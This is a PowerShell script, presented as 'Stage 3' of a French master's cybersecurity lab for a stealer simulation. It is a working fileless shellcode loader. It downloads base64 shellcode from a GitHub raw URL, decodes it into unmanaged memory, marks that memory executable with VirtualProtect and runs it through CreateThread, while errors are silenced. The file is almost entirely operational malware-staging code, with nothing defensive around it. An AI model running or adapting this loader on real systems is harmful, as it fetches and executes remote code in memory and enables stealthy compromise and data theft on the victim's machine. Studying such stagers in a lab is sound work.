# ============================================
# Stage 3 - Chargement Shellcode en memoire
# Lab pedagogique Master Cybersecurite
# ============================================

$ErrorActionPreference = "SilentlyContinue"

# Telechargement shellcode base64 depuis GitHub
$b64url = "https://raw.githubusercontent.com/asmaerouel/SimulationStealer/main/shellcode_b64.txt"
$b64 = (New-Object Net.WebClient).DownloadString($b64url)

# Decodage Base64 vers bytes
$shellcode = [Convert]::FromBase64String($b64.Trim())

# Allocation memoire
$size = $shellcode.Length
$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)

# Copie shellcode en memoire
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)

# Changement permissions memoire (RWX)
$old = 0
$kernel32 = Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
"@ -Name "Kernel32" -Namespace "Win32" -PassThru

$kernel32::VirtualProtect($addr, [UIntPtr]$size, 0x40, [ref]$old)

# Execution shellcode dans un thread
$threadId = 0
$thread = $kernel32::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [ref]$threadId)
$kernel32::WaitForSingleObject($thread, 0xFFFFFFFF)